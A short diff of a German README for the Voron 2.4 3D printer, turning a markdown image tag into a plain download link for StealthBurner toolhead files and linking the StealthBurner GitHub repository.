@@ -1,5 +1,5 @@
 Voron 2.4
-![CLICK HERE TO DOWNLOAD](https://voron.zip/done/V2.zip)
+[CLICK HERE TO DOWNLOAD](https://voron.zip/done/V2.zip)
 
 Der obige Link enthält die StealthBurner Toolhead-Dateien, die mit mehreren Druckern in der Voron-Reihe kompatibel sind. Um alles ordentlich zu halten, werden die Dateien des StealthBurner separat verwaltet. Das StealthBurner-Repository kann durchgeblättert werden, indem man darauf klickt. [HERE](https://github.com/VoronDesign/Voron-Stealthburner)
 
